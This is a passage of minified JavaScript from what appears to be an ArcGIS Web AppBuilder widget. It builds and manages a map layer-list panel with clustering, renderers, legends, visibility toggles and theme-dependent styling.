{geometry:{paths:a.geometry.paths,spatialReference:{wkid:d.wkid}}}:"undefined"!==typeof a.geometry.points?{geometry:{points:a.geometry.points,spatialReference:{wkid:d.wkid}}}:{geometry:new W(a.geometry.x,a.geometry.y,a.geometry.spatialReference),symbol:e.symbol}},_initWidget:function(){this.hidePanel="undefined"!==typeof this.config.hidePanel?this.config.hidePanel:!1;this.showAllFeatures="undefined"!==typeof this.config.showAllFeatures?this.config.showAllFeatures:!1;this.map.itemId&&G.getInstance(this.map,
this.map.itemInfo).then(h.hitch(this,function(a){this.wmLayerInfos=a.getLayerInfoArrayOfWebmap();this.layerInfos=a.getLayerInfoArray();this.operLayerInfos=a;this._updateLayerIDs();this.config.upgradeFields&&this._upgradeFields();this._createPanelUI(this.configLayerInfos,a);this._addFilterChanged(a);this._addVisibleChanged(a);this._addZoomChanged(a)}))},_updateLayerIDs:function(){var a=[],d=0;for(;d<this.configLayerInfos.length;d++){var e=this.configLayerInfos[d],b=this.operLayerInfos.getLayerInfoById(e.id);
if(!b){var c=!1,n=0;b:for(;n<this.wmLayerInfos.length;n++){var g=this.wmLayerInfos[n],m=g?g.originOperLayer:void 0,f=this._compareURL(m,e),m=this._compareItemID(m,e),g=this._compareSubId(g,e);if(b=(f=f?f:m?m:g?g:void 0)?this.operLayerInfos.getLayerInfoById(f):b){this.configLayerInfos[d].id=b.id;this.configLayerInfos[d].layer=b.id;c=!0;break b}}c||b||a.push(d)}}0<a.length&&(a.sort(function(a,d){return d-a}),H.forEach(a,h.hitch(this,function(a){this.configLayerInfos.splice(a,1)})))},_compareSubId:function(a,
d){if(a&&a.subId&&-1<a.subId.indexOf(d.id)&&a.layerObject){var e=this._compareGeom(a.layerObject,d);d=this._compareFields(a.layerObject,d);if(e&&d)return a.subId}},_compareItemID:function(a,d){if(a&&a.itemId&&a.itemId===d.itemId)if(a.featureCollection&&a.featureCollection.layers&&a.featureCollection.layers.hasOwnProperty("length")){a=a.featureCollection.layers;for(var e=0;e<a.length;e++){var b=a[e];if(this._compareGeom(b,d)&&this._compareFields(b,d))return b.id}}else console.log("error in checking item by itemID")},
_compareURL:function(a,d){return a&&a.url&&d.url&&a.url===d.url?a.id:void 0},_compareGeom:function(a,d){return a&&a.geometryType&&d.geometryType?a.geometryType===d.geometryType:void 0},_compareFields:function(a,d){var e;a&&a.fields&&d.fields&&a.fields.length===d.fields.length&&(e=a.fields.filter(function(a){for(var e=0;e<d.fields.length;e++)if(a.name===d.fields[e].name)return a}).length===a.fields.length);return e},_upgradeFields:function(){if(this.configLayerInfos)for(var a=0;a<this.configLayerInfos.length;a++){var d=
this.configLayerInfos[a];if(d&&d.symbolData&&d.symbolData.featureDisplayOptions){var e=this.operLayerInfos.getLayerInfoById(d.id);if(e){var b=d.symbolData.featureDisplayOptions.fields;if("undefined"===typeof b||b.hasOwnProperty("length")&&0===b.length){var c=e&&e.layerObject?e.layerObject:void 0,b=c&&c.objectIdField?c.objectIdField:void 0,n="",g="";if((c=d.fields?d.fields:c?c.fields:void 0)&&0<c.length){var m=0;a:for(;m<c.length;m++){var h=c[m];""===n&&"esriFieldTypeOID"!==h.type&&"esriFieldTypeGeometry"!==
h.type&&h.name!==b&&(n=h.name,g=h.alias||h.name);b||(b="esriFieldTypeOID"===h.type?h.name:b);if(b&&""!==n)break a}}m=c="";d=d.infoTemplate&&d.infoTemplate.info&&d.infoTemplate.info.fieldInfos?d.infoTemplate:e?e.getInfoTemplate():void 0;if(!d)a:for(e=e.getSubLayers(),h=0;h<e.length;h++){var f=e[h];if(f.title&&f.layerObject&&f.layerObject.name&&f.title===f.layerObject.name){d=f.getInfoTemplate?f.getInfoTemplate():d;break a}}e=d?d.info.fieldInfos:[];d=0;a:for(;d<e.length;d++)if((h=e[d])&&h.visible&&
(!b||b!==h.fieldName)){c=h.fieldName;m=h.label||h.fieldName;break a}this.configLayerInfos[a].symbolData.featureDisplayOptions.fields=[{name:c?c:n,label:c?m:g}]}}}}},_addFilterChanged:function(a){2.1<=parseFloat(this.appConfig.wabVersion)&&this.own(a.on("layerInfosFilterChanged",h.hitch(this,function(a){H.forEach(a,h.hitch(this,function(a){var d=a.id,e=a.id+this.UNIQUE_APPEND_VAL_CL;this.layerList.hasOwnProperty(d)?this.layerList[d].filter=a.getFilter():this.layerList.hasOwnProperty(e)&&(this.layerList[e].layerObject.filter=
a.getFilter(),this.layerList[e].layerObject._initFeatures())}))})))},_updateVisibility:function(a){if(a){var d=a.id,e=a.isShowInMap();if(this.layerList.hasOwnProperty(d)){var b=this.layerList[d];d===b.li.id&&b.visible!==e?this._toggleLayerUI(b.li,e):d===b.id&&b.visible!==e&&this._toggleLayerUI(a,e)}}},_addVisibleChanged:function(a){this.own(a.on("layerInfosIsVisibleChanged",h.hitch(this,function(a){H.forEach(a,function(a){this._updateVisibility(a)},this)})))},_addZoomChanged:function(a){this.own(q(this.map,
"zoom-end",h.hitch(this,function(){a.traversal(h.hitch(this,function(a){this._updateVisibility(a)}))})))},_updatePanelHeader:function(){var a;a=this.map.width;this.config.displayPanelIcon&&750<a?(this.pageHeader&&(g.removeClass(this.pageHeader,"pageHeaderNoIcon"),g.removeClass(this.pageHeader,"pageHeaderNoIconRefresh"),this.config.refreshEnabled?""!==this.config.mainPanelText?g.addClass(this.pageHeader,"pageHeaderRefresh"):g.addClass(this.pageHeader,"pageHeaderRefreshNoText"):g.addClass(this.pageHeader,
"pageHeader")),this.pageBody&&(g.removeClass(this.pageBody,"pageBodyNoIcon"),g.removeClass(this.pageBody,"pageBodyNoIconRefresh"),this.config.refreshEnabled?""!==this.config.mainPanelText?g.addClass(this.pageBody,"pageBodyRefresh"):g.addClass(this.pageBody,"pageBodyRefreshNoText"):g.addClass(this.pageBody,"pageBody")),this.pageTitle&&(g.addClass(this.pageTitle,"pageTitleWidth"),this.config.refreshEnabled?(g.removeClass(this.pageTitle,"pageTitle"),g.removeClass(this.pageTitle,"pageTitleRefresh-tab"),
g.removeClass(this.pageTitle,"pageTitleRefresh"),g.addClass(this.pageTitle,this.useDarkText?"pageTitleRefresh-tab":"pageTitleRefresh")):(g.removeClass(this.pageTitle,"pageTitleRefresh"),g.removeClass(this.pageTitle,"pageTitleRefresh-tab"),g.addClass(this.pageTitle,"pageTitle"))),a=this.config.mainPanelText,"undefined"===typeof a&&(a=""),this.pageTitle.innerHTML=a,this.panelMainIcon.innerHTML=this.config.mainPanelIcon):this.config.displayPanelIcon||this.config.refreshEnabled?!this.config.displayPanelIcon&&
this.config.refreshEnabled?(this.pageHeader&&(g.removeClass(this.pageHeader,"pageHeader"),g.removeClass(this.pageHeader,"pageHeaderNoIcon"),g.addClass(this.pageHeader,"pageHeaderNoIconRefresh")),this.pageBody&&(g.removeClass(this.pageBody,"pageBody"),g.removeClass(this.pageBody,"pageBodyNoIcon"),g.addClass(this.pageBody,"pageBodyNoIconRefresh")),this.pageTitle&&g.removeClass(this.pageTitle,"pageTitleWidth"),this.pageTitle.innerHTML="\x3cdiv\x3e\x3c/div\x3e",this.panelMainIcon.innerHTML="\x3cdiv\x3e\x3c/div\x3e"):
this.config.displayPanelIcon&&750>=a&&this.config.refreshEnabled&&(this.pageHeader&&(g.removeClass(this.pageHeader,"pageHeaderNoIcon"),g.removeClass(this.pageHeader,"pageHeaderNoIconRefresh"),g.removeClass(this.pageHeader,"pageHeader"),""!==this.config.mainPanelText?g.addClass(this.pageHeader,"pageHeaderRefresh"):g.addClass(this.pageHeader,"pageHeaderRefreshNoText")),this.pageBody&&(g.removeClass(this.pageBody,"pageBodyNoIcon"),g.removeClass(this.pageBody,"pageBodyNoIconRefresh"),g.removeClass(this.pageBody,
"pageBody"),""!==this.config.mainPanelText?g.addClass(this.pageBody,"pageBodyRefresh"):g.addClass(this.pageBody,"pageBodyRefreshNoText")),this.pageTitle&&g.addClass(this.pageTitle,"pageTitleWidth"),a=this.config.mainPanelText,"undefined"===typeof a&&(a=""),this.pageTitle.innerHTML=a):(this.pageHeader&&(g.removeClass(this.pageHeader,"pageHeader"),g.removeClass(this.pageHeader,"pageHeaderNoIconRefresh"),g.addClass(this.pageHeader,"pageHeaderNoIcon")),this.pageBody&&(g.removeClass(this.pageBody,"pageBody"),
g.removeClass(this.pageBody,"pageBodyNoIconRefresh"),g.addClass(this.pageBody,"pageBodyNoIcon")),this.pageTitle.innerHTML="\x3cdiv\x3e\x3c/div\x3e",this.panelMainIcon.innerHTML="\x3cdiv\x3e\x3c/div\x3e")},_createPanelUI:function(a,d){this.numClusterLayers=0;this.hidePanel||(this._updatePanelHeader(),this._updateUI(null),this._clearChildNodes(this.pageMain),this.updateEnd=[]);for(var e=0;e<a.length;e++){var b=a[e];"ThemeCluster"===b.symbolData.clusterType&&this.updateThemeClusterSymbol(b,e);var c=
d.getLayerInfoById(b.id);c&&c.getLayerType().then(h.hitch(this,function(a){c.getLayerObject().then(h.hitch(this,function(d){this.updateLayerList(d,b,a,c)}))}))}if(!this.hidePanel)for(var n in this.layerList)a=this.layerList[n],"ClusterLayer"!==a.type&&a&&a.layerObject&&a.layerObject.hasOwnProperty("refreshInterval")&&0<a.layerObject.refreshInterval&&this.updateEnd.push(this.own(q(a.layerObject,"update-end",h.hitch(this,this._updateEnd))));this.addMapLayers()},_updateEnd:function(a){var d=this.layerList.hasOwnProperty(a.target.id)?
a.target.id:this.layerList.hasOwnProperty(a.target.id+"_CL")?a.target.id+"_CL":"";if(""===d)for(var e in this.layerList){var b=this.layerList[e];if(b&&b.layerObject&&b.layerObject.id===a.target.id){d=b.li.id;break}}this.layerList.hasOwnProperty(d)&&(a=this.layerList[d],a.isLoaded=!1,a.updating=!1,a.requiresReload=!0,a&&(a.legendOpen?this._loadList(a,this.config.countEnabled):this.config.countEnabled&&this.countFeatures(a)))},updateThemeClusterSymbol:function(a,d){a=a.symbolData;this.appConfig.theme.styles&&
this.appConfig.theme.styles[0]&&"undefined"===typeof this._styleColor&&this._updateStyleColor(this.appConfig.theme.styles[0]);if(this._styleColor){var b=z.fromHex(this._styleColor);d+=1;var c=0<d?30*d:30,g=0===d%2,n=b.g,h=b.b,b=b.r-c;g&&(255<b?b-=255:0>b&&(b+=255));h-=c;0===d%3&&g&&(255<h?h-=255:0>h&&(h+=255));c=n-c;0===d%5&&g&&(255<c?c-=255:0>c&&(c+=255));a.clusterType="CustomCluster";a.clusterSymbol={color:[b,c,h,1],outline:{color:[0,0,0,0],width:0,type:"esriSLS",style:"esriSLSNull"},type:"esriSFS",
style:"esriSFSSolid"}}},removeOldClusterLayers:function(a){var d=[],b;for(b in this.layerList)if("ClusterLayer"===this.layerList[b].type){var c=0;a:for(;c<a.length;c++){var g=a[c];if(g.id+this.UNIQUE_APPEND_VAL_CL===b){g.symbolData&&!g.symbolData.clusteringEnabled&&d.push(b);break a}}}if(0<d.length)for(var n in d)if(this.layerList.hasOwnProperty(d[n])){if(-1<this.map.graphicsLayerIds.indexOf(d[n])){if((a=this.layerList[d[n]])&&a.li){var h;a.li.parentLayerID&&(h=this.operLayerInfos.getLayerInfoById(a.li.parentLayerID));
!h&&a.li.layer&&(h=this.operLayerInfos.getLayerInfoById(a.li.layer));h&&a.hasOwnProperty("parentLayerVisible")&&h.setTopLayerVisible(a.parentLayerVisible)}this.map.removeLayer(this.layerList[d[n]].layerObject)}this.layerList[d[n]].layerObject.destroy();delete this.layerList[d[n]]}},addMapLayers:function(){for(var a=Object.keys(this.layerList).reverse(),d=0;d<a.length;d++){var b=a[d],c=this.layerList[b];c.type&&"ClusterLayer"===c.type&&-1===this.map.graphicsLayerIds.indexOf(b)&&this.map.addLayer(c.layerObject)}},
updateLayerList:function(a,d,b,c){var e,g=null,r,m,f;c=c||this.operLayerInfos.getLayerInfoById(a.id);var k=this._checkSelfType(c,d,b,a),l=this._checkListDisabled(d);if(d.symbolData.clusteringEnabled)e=this._getClusterLayer(d,a,c,b),r="ClusterLayer",b=e,m=e.id,this.hidePanel||this.own(q(e,"update-end",h.hitch(this,function(){this._loadList(this.layerList[e.id],!0)}))),this.numClusterLayers+=1;else if("ArcGISStreamLayer"===a.layerType)r="StreamLayer",m=a.layerObject.id,b=a.layerObject,f=a;else{m="FeatureLayer"===
b?d.id:a.id;var p=this.operLayerInfos.getLayerInfoById(d.parentLayerID)||a.parentLayerInfo;if(p&&p.layerObject&&(g=p.layerObject,r=g.type,p.originOperLayer&&p.originOperLayer.featureCollection&&(r=p.originOperLayer.featureCollection.layers)))for(p=0;p<r.length;p++){var V=r[p];V.id===m&&(f=V)}e=a.layerObject?a.layerObject:a;r=b;b=g&&!g.empty?g:e?e:a;if("geo_rss"===k&&b&&b.getFeatureLayers)for(p=b.getFeatureLayers(),V=0;V<p.length;V++){var t=p[V];t.id===d.id&&(b=t)}f=f?f:a}this.layerList[m]={type:r,
layerObject:b,pl:f,id:m,visible:c&&c.isShowInMap?c.isShowInMap():!0,li:d,filter:c?c.getFilter():"1\x3d1",infoTemplate:c.getInfoTemplate()||d.infoTemplate,selfType:k,listDisabled:l,showAllFeatures:this.showAllFeatures};"ArcGISStreamLayer"!==a.layerType&&this.updateRenderer(m);this.hidePanel||this._addPanelItem(g?g:e?e:a,d,l,c)},_checkListDisabled:function(a){return a.symbolData.featureDisplayOptions.listDisabled?a.symbolData.featureDisplayOptions.listDisabled:a.symbolData.featureDisplayOptions.fields?
0===a.symbolData.featureDisplayOptions.fields.length:!0},_checkSelfType:function(a,d,b,c){c=(d=d.layerObject&&!d.layerObject.empty?d.layerObject:c)&&d.originOperLayer?d.originOperLayer:c;a=(a=a.originOperLayer&&a.originOperLayer.selfType?a.originOperLayer.selfType:c&&c.selfType?c.selfType:"")&&""!==a?a:c&&c.layerType&&"CSV"===c.layerType?"collection":"Feature Collection"===b?"collection":"";!a&&b&&"KML"===b&&(a="kml");return a},updateRenderer:function(a){a=this.layerList[a];if("LayerSymbol"!==a.li.symbolData.symbolType){"undefined"===
typeof a.li.orgRenderer&&(a.li.orgRenderer=a.layerObject.renderer?a.layerObject.renderer:a.li.renderer);var d=new ea(ba.fromJson(a.li.symbolData.symbol));a.li.newRenderer=d;if(a.layerObject.setRenderer)a.layerObject.setRenderer(d);else if(a.layerObject.setLayerDrawingOptions){var b=[],c=new da;c.renderer=d;b[a.li.subLayerId]=c;a.layerObject.setLayerDrawingOptions(b)}else console.log("Error setting the new renderer...will use the default rendering of the layer");"function"===typeof a.layerObject.refresh&&
a.layerObject.refresh()}},_onRecNodeMouseover:function(a){b.add(a,this.isDartTheme?"layer-row-mouseover-dart":this.isDashboardTheme&&!this.isLightTheme?"layer-row-mouseover-dashboard":"layer-row-mouseover")},_onRecNodeMouseout:function(a){b.remove(a,this.isDartTheme?"layer-row-mouseover-dart":this.isDashboardTheme&&!this.isLightTheme?"layer-row-mouseover-dashboard":"layer-row-mouseover")},_addPanelItem:function(a,d,b,c){var e=d.id+this.UNIQUE_APPEND_VAL_CL,e=d.id in this.layerList?d.id:e in this.layerList?
e:"",n=this.layerList[e];if(n){var f=n.type,m;m=this.isDashboardTheme?["rec","expand","expandDown-dashboard","solidBorder"]:this.isDartTheme?["rec-dart","expand-dart","expandDown-dart","solidBorder-dart"]:["rec","expand","expandDown","solidBorder"];var r=l.create("div",{"class":m[0]+" "+m[3],id:"rec_"+e},this.pageMain);b?(g.setStyle(r,"cursor","default"),m="expand-empty"):(this.own(q(r,"mouseover",h.hitch(this,this._onRecNodeMouseover,r))),this.own(q(r,"mouseout",h.hitch(this,this._onRecNodeMouseout,
r))),m=m[1]+" "+m[2],c&&c.isInScale&&(m+=c.isInScale()?"":" expandInActive"));l.create("div",{"class":m,id:"exp_"+e},r);c=l.create("div",{"class":"recIcon active",id:"recIcon_"+e},r);d.panelImageData&&-1<d.panelImageData.toString().indexOf("\x3cimg")&&(m=document.createElement("div"),m.innerHTML=d.panelImageData,m=new T(m.children[0].src,26,26),d.panelImageData=this._createImageDataDiv(m,44,44,void 0,!0).innerHTML);c.innerHTML=d.panelImageData;R.set(c.firstChild,"border-radius","41px");var k;this.config.countEnabled?
(d=l.create("div",{"class":"recLabel",id:"recLabel_"+e,innerHTML:"\x3cp\x3e"+d.label+"\x3c/p\x3e"},r),g.setStyle(d,"top","20px"),k=l.create("div",{"class":"recNum",id:"recNum_"+e,innerHTML:""},r)):d=l.create("div",{"class":"recLabelNoCount",id:"recLabel_"+e,innerHTML:"\x3cp\x3e"+d.label+"\x3c/p\x3e"},r);"ClusterLayer"===f?(a.node=k,b||this._addLegend(e,n),a._updateNode(a.nodeCount)):"StreamLayer"===f?(n.node=k,this.countFeatures(n),b||this._addLegend(e,n)):(n.node=k,this._addLegend(e,n));q(c,"click",
h.hitch(this,this._toggleLayerVisibility,n));b||(n.toggleLegend=q(r,"click",h.hitch(this,this._toggleLegend,n)))}},_addLegend:function(a,d){d.legendOpen=null===this.row&&this.config.expandList;d.legendNode=l.create("div",{"class":"legendLayer "+(d.legendOpen?"legendOn":"legendOff"),id:"legend_"+a},this.pageMain);"ClusterLayer"===d.type&&(d.layerObject.legendNode=d.legendNode);this.row="firstRowExpanded"},_getListFields:function(a){var d=[],b=this._getInfoTemplate(a);H.forEach(b&&b.info&&b.info.fieldInfos?
b.info.fieldInfos:[],function(a){a.visible&&d.push(a.fieldName)});var c=a.li.symbolData&&a.li.symbolData.featureDisplayOptions?a.li.symbolData.featureDisplayOptions:{};H.forEach(c.fields||[],function(a){-1===d.indexOf(a.name)&&d.push(a.name)});c.groupField&&-1===d.indexOf(c.groupField.name)&&d.push(c.groupField.name);if(0===d.length||"undefined"===typeof b)d=["*"];"*"!==d[0]&&a.layerObject&&a.layerObject.objectIdField&&-1===d.indexOf(a.layerObject.objectIdField)&&d.push(a.layerObject.objectIdField);
return d},_loadList:function(a,d){if(!this.hidePanel){var e=a.layerObject.id in this.layerList?a.layerObject.id:a.li.id;d&&this._addSearching(e);var c=this._getListFields(a);if("ClusterLayer"===a.type){a.li.layerListExtentChanged&&(a.layerObject.clusterFeatures(),a.li.layerListExtentChanged=!1);var g=[];if(a.layerObject.clusterGraphics||a.layerObject._features){if(this.showAllFeatures)g=a.layerObject._features;else for(var e=a.layerObject.clusterGraphics,n=0;n<e.length;n++){var f=e[n];if(f.graphics&&
0<f.graphics.length)for(var m=0;m<f.graphics.length;m++)g.push(f.graphics[m])}setTimeout(h.hitch(this,function(){this._updateList(g,a.legendNode,a.layerObject.node,c,d,a)}),100)}else this._removeSearching(e,a.legendNode?!b.contains(a.legendNode,"legendOff"):!0)}else this.getFeatures(a,c,d)}},_addSearching:function(a){var d=this.layerList[a].listDisabled,e=d?"expand-empty":this.isDartTheme?"expandDown-dart":this.isDashboardTheme&&!this.isLightTheme?"expandDown-dashboard":"expandDown",c=d?"expand-empty":
this.isDartTheme?"expandUp-dart":this.isDashboardTheme&&!this.isLightTheme?"expandUp-dashboard":"expandUp",d=d?"expandSearching-empty":"expandSearching";b.contains("exp_"+a,e)&&(b.remove("exp_"+a,e),b.add("exp_"+a,d));b.contains("exp_"+a,c)&&(b.remove("exp_"+a,c),b.add("exp_"+a,d))},_removeSearching:function(a,d){var e=this.layerList[a].listDisabled,c=e?"expand-empty":this.isDartTheme?"expandDown-dart":this.isDashboardTheme&&!this.isLightTheme?"expandDown-dashboard":"expandDown",g=e?"expand-empty":
this.isDartTheme?"expandUp-dart":this.isDashboardTheme&&!this.isLightTheme?"expandUp-dashboard":"expandUp",e=e?"expandSearching-empty":"expandSearching";b.contains("exp_"+a,e)&&(b.remove("exp_"+a,e),b.add("exp_"+a,d?g:c))},_getClusterLayer:function(a,d,b,c){var e=d.layerObject?d.layerObject:d,g=a.infoTemplate,h=e&&e.originOperLayer?e.originOperLayer:d.parentLayerInfo?d.parentLayerInfo:b?b.originOperLayer:void 0,f=null,f=a.id+this.UNIQUE_APPEND_VAL_CL;d=!0;-1<this.map.graphicsLayerIds.indexOf(f)||
-1<this.map._layers.indexOf(f)?(f=this.map.getLayer(f),g=e=!1,JSON.stringify(f.symbolData)!==JSON.stringify(a.symbolData)&&(f.symbolData=a.symbolData,f.countColor=a.symbolData._highLightColor,g=!0),c=l.toDom(a.panelImageData),JSON.stringify(f.icon)!==JSON.stringify(c.src)&&(f.icon=c.src,g=!0),l.destroy(c.id),f.displayFeatureCount=a.symbolData.displayFeatureCount,f.refresh!==a.refresh&&(f.refresh=a.refresh,e=!0),g&&f._setupSymbols(),f.countEnabled=this.config.countEnabled,f.hidePanel=this.hidePanel,
f.showAllFeatures!==this.showAllFeatures&&(e=!0,f.showAllFeatures=this.showAllFeatures),f.listDisabled!==this.listDisabled&&(e=!0,f.listDisabled=this.listDisabled),e?f.url&&f.refreshFeatures(f.url):g&&f.clusterFeatures()):(d=!1,f=new fa({name:a.label+this.UNIQUE_APPEND_VAL_CL,id:f,map:this.map,node:p.byId("recNum_"+f),legendNode:p.byId("legend_"+f),infoTemplate:"undefined"!==typeof e.infoTemplate?e.infoTemplate:g,refreshInterval:this.config.refreshInterval,refreshEnabled:this.config.refreshEnabled,
parentLayer:e,lyrInfo:a,lyrType:c,_styleColor:this._styleColor,originOperLayer:h,countEnabled:this.config.countEnabled,hidePanel:this.hidePanel,filter:b?b.getFilter():"1\x3d1",showAllFeatures:this.showAllFeatures,listDisabled:this.listDisabled}));f.setVisibility(d?f.visible:b.isShowInMap?b.isShowInMap():!0);return f},_createImageDataDiv:function(a,d,b,g,f){var e;if(a){e=d;var h=b;if(a.height&&a.width){var r;if(a.height>a.width)r=a.width/a.height,h=d*r;else if(a.width===a.height||a.width>a.height)h=
d,r=a.width/a.height,e=0<r?b*r:b}"undefined"!==typeof a.setWidth?"undefined"!==typeof a.setHeight?(a.setWidth(f?h-.25*h:h),a.setHeight(f?e-.25*e:e)):a.setWidth(2):"undefined"!==typeof a.size&&20<a.size&&a.setSize(20);e=l.create("div",{"class":"imageDataGFX"},g);g=c.createSurface(e,d,b);a=ba.getShapeDescriptors(a);g.createShape(a.defaultShape).setFill(a.fill).setStroke(a.stroke).applyTransform({dx:d/2,dy:b/2})}return e},_updateUI:function(a){this.styleName=a;this.isDashboardTheme&&(this.isLightTheme=
a?"light"===a:this.isLightTheme,this._updateNodes(this.isLightTheme?"expandDown-dashboard":"expandDown",this.isLightTheme?"expandDown":"expandDown-dashboard"),this._updateNodes(this.isLightTheme?"expandUp-dashboard":"expandUp",this.isLightTheme?"expandUp":"expandUp-dashboard"),this._updateNodes(this.isLightTheme?"expand-dashboard":"expand",this.isLightTheme?"expand":"expand-dashboard"),this._updateNodes(this.isLightTheme?"groupItemImageUp-dashboard":"groupItemImageUp",this.isLightTheme?"groupItemImageUp":
"groupItemImageUp-dashboard"),this._updateNodes(this.isLightTheme?"groupItemImageDown-dashboard":"groupItemImageDown",this.isLightTheme?"groupItemImageDown":"groupItemImageDown-dashboard"),this._updateNodes(this.isLightTheme?"groupItemImage-dashboard":"groupItemImage",this.isLightTheme?"groupItemImage":"groupItemImage-dashboard"))},_updateNodes:function(a,d){var e=B("."+a);H.forEach(e,function(e){b.remove(e,a);b.add(e,d)})},_toggleLayerVisibility:function(a,d){d.stopPropagation();this.map.infoWindow.hide();
d=a.id?a.id:a.layerObject.id;var e=this.layerList[d];e||(a.pl&&(d=a.pl.id),e=this.layerList[d]);if(e){var c=e.li&&e.li.hasOwnProperty("subLayerId")?"undefined"!==typeof e.li.subLayerId&&"-1"!==e.li.subLayerId.toString():!1;a=this.operLayerInfos.getLayerInfoById(d);var g=!b.contains("recIcon_"+d,"active");if(c&&"ClusterLayer"!==e.type){if(g)for(d=a.parentLayerInfo;d;)d.setTopLayerVisible(!0),d=d.parentLayerInfo;a.setTopLayerVisible(g)}else e&&(e.layerObject.setVisibility(g),"ClusterLayer"===e.type&&
g&&(e.layerObject.handleMapExtentChange({levelChange:!0}),e.layerObject.flashFeatures()),"undefined"!==typeof e.pl&&(e.pl.visibility=g,-1<this.map.graphicsLayerIds.indexOf(d)&&this.map.getLayer(d).setVisibility(g)))}},_toggleLayerUI:function(a,d){var e=a.id?a.id:a.layerObject.id,c=this.layerList[e];c||(a.pl&&(e=a.pl.id),c=this.layerList[e]);if(c){a=this.operLayerInfos.getLayerInfoById(e);a=a.isCurrentScaleInTheScaleRange?a.isCurrentScaleInTheScaleRange():!0;var g=p.byId("recLabel_"+e);this.layerList[e].visible=
d;this.layerList[e].parentLayerVisible=d;"ClusterLayer"===this.layerList[e].type&&(this.layerList[e].layerObject.parentLayerVisible=d);if(this.config.countEnabled&&b.contains("recNum_"+e,d?"recNumInActive":"recNum")){var f=this.isDartTheme?" darkThemeColor":" lightThemeColor";b.remove("recNum_"+e,d?"recNumInActive":"recNum");b.add("recNum_"+e,(d?"recNum":"recNumInActive")+f)}var f=this.isDartTheme?"expandDown-dart":this.isDashboardTheme&&!this.isLightTheme?"expandDown-dashboard":"expandDown",k=this.isDartTheme?
"expandUp-dart":this.isDashboardTheme&&!this.isLightTheme?"expandUp-dashboard":"expandUp";if(d){b.add("recIcon_"+e,"active");g&&g.firstChild&&b.remove(g.firstChild,"inActive");b.contains("exp_"+e,"expandInActive")&&a&&b.remove("exp_"+e,"expandInActive");c.toggleLegend&&c.toggleLegend.remove();if(d=p.byId("rec_"+e))c.toggleLegend=q(d,"click",h.hitch(this,this._toggleLegend,c));b.contains("rec_"+e,"recDefault")&&b.remove("rec_"+e,"recDefault");c.listDisabled||(this._loadList(c,!0),c.legendOpen&&(b.add("legend_"+
e,"legendOn"),b.remove("legend_"+e,"legendOff"),b.contains("exp_"+e,f)&&(b.remove("exp_"+e,f),b.add("exp_"+e,k))))}else b.remove("recIcon_"+e,"active"),g&&g.firstChild&&b.add(g.firstChild,"inActive"),b.contains("exp_"+e,"expandInActive")||b.add("exp_"+e,"expandInActive"),c.legendOpen&&b.contains("legend_"+e,"legendOn")&&(b.remove("legend_"+e,"legendOn"),b.add("legend_"+e,"legendOff"),b.contains("exp_"+e,k)&&(b.remove("exp_"+e,k),b.add("exp_"+e,f))),c.toggleLegend&&c.toggleLegend.remove(),b.contains("rec_"+
e,"rec")&&b.add("rec_"+e,"recDefault")}return!1},_toggleLegend:function(a,d){if("thumb2"!==d.currentTarget.className&&"recIcon"!==d.currentTarget.className){var e=a.layerObject.id in this.layerList?a.layerObject.id:a.li.id;if(b.contains("legend_"+e,"legendOff")){this._addSearching(e);this.layerList[e].legendOpen=!0;if("undefined"===typeof this.layerList[e].li.layerListExtentChanged||this.layerList[e].requiresReload)this.layerList[e].li.layerListExtentChanged=!0,this.layerList[e].requiresReload=!1;
this.layerList[e].li.layerListExtentChanged?setTimeout(h.hitch(this,function(){this._loadList(a,!1)}),500):this._removeSearching(e,!0);b.remove("legend_"+e,"legendOff");b.add("legend_"+e,"legendOn")}else if(b.contains("legend_"+e,"legendOn")){this.layerList[e].legendOpen=!1;var c=this.isDartTheme?"expandDown-dart":this.isDashboardTheme&&!this.isLightTheme?"expandDown-dashboard":"expandDown",g=this.isDartTheme?"expandUp-dart":this.isDashboardTheme&&!this.isLightTheme?"expandUp-dashboard":"expandUp";
b.contains("exp_"+e,g)&&(b.remove("exp_"+e,g),b.add("exp_"+e,c));b.remove("legend_"+e,"legendOn");b.add("legend_"+e,"legendOff")}}d.stopPropagation()},_toggleGroup:function(a,d){var e=d.currentTarget.id.slice(0,-2),c=this.isDartTheme?"featureItem-dart":"featureItem",f=!0;d.target.parentNode&&(""!==d.target.parentNode.id&&b.contains(d.target.parentNode.id,c)&&(f=!1),""!==d.target.id&&b.contains(d.target.id,c)&&(f=!1));var c=this.isDartTheme?"groupItemImage-dart":this.isDashboardTheme&&!this.isLightTheme?
"groupItemImage-dashboard":"groupItemImage",h=this.isDartTheme?"groupItemImageUp-dart":this.isDashboardTheme&&!this.isLightTheme?"groupItemImageUp-dashboard":"groupItemImageUp",k=this.isDartTheme?"groupItemImageDown-dart":this.isDashboardTheme&&!this.isLightTheme?"groupItemImageDown-dashboard":"groupItemImageDown";if(f){a=a.layerObject.id in this.layerList?a.layerObject.id:a.li.id;var f=document.getElementById(d.currentTarget.id),m=f.childNodes[0].childNodes.length-1;b.contains(e,"groupOff")?(this.layerList[a].openGroups&&
0<this.layerList[a].openGroups.length?-1===this.layerList[a].openGroups.indexOf(e)&&this.layerList[a].openGroups.push(e):this.layerList[a].openGroups=[e],b.remove(e,"groupOff"),b.add(e,"groupOn"),this.layerList[a].groupOpen=!0,-1<f.childNodes[0].childNodes[m].childNodes[0].className.indexOf(c)&&(g.removeClass(f.childNodes[0].childNodes[m].childNodes[0],k),g.addClass(f.childNodes[0].childNodes[m].childNodes[0],h))):b.contains(e,"groupOn")&&(b.remove(e,"groupOn"),b.add(e,"groupOff"),this.layerList[a].openGroups&&
0<this.layerList[a].openGroups.length?(e=this.layerList[a].openGroups.indexOf(e),-1<e&&this.layerList[a].openGroups.splice(e,1),0===this.layerList[a].openGroups.length&&(this.layerList[a].groupOpen=!1)):this.layerList[a].groupOpen=!1,-1<f.childNodes[0].childNodes[m].childNodes[0].className.indexOf(c)&&(g.removeClass(f.childNodes[0].childNodes[m].childNodes[0],h),g.addClass(d.currentTarget.childNodes[0].childNodes[m].childNodes[0],k)))}},onAppConfigChanged:function(a,d,b){switch(d){case "themeChange":this.inPanelOverrides(b);
this.destroy();break;case "layoutChange":this.inPanelOverrides(b);break;case "styleChange":this.hidePanel||(this._updateUI(b),this._updateStyleColor(b));break;case "widgetChange":this.widgetChange=!0;b&&b.config&&b.config.layerInfos&&this.removeOldClusterLayers(b.config.layerInfos);this.row=null;break;case "mapChange":this._clearMap()}},_updateStyleColor:function(a){setTimeout(h.hitch(this,function(){var b=this.getPanel();switch(this.appConfig.theme.name){case "BoxTheme":b=b.containerNode.parentNode.parentNode.children[0];
